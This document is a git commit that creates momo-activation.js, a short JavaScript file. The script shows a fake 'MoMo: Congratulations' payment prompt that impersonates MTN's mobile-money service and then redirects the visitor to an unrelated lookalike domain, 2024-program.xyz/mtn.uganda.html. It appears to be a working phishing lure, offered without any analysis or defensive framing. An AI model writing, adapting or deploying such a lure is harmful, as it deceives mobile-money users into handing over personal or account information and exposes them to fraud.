2831190ddfd582d03c1c63d7e4cef8e44910f4d1
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-06-06 01:49:10 -0700

    Create momo-activation.js

---
+++ momo-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('MoMo: Congratulations, you are among the selected ones to receive MoMo Payment, kindly press 1 to submit your information now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/mtn.uganda.html';
+}
